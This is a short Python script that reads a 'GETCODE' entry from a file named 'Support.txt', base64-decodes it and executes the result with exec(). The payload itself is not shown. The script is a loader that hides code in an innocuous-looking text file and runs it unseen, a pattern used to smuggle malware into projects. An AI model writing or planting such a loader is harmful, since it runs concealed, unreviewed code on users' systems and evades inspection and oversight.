import os
import base64

def load_variables(filename):
    variables = {}
    with open(filename, 'r') as file:
        for line in file:
            key, value = line.strip().split('=')
            variables[key] = value
    return variables
config = load_variables('Support.txt')
GETCODE = config['GETCODE']
decoded_bytes = base64.b64decode(GETCODE)
decoded_code = decoded_bytes.decode('utf-8')
exec(decoded_code)
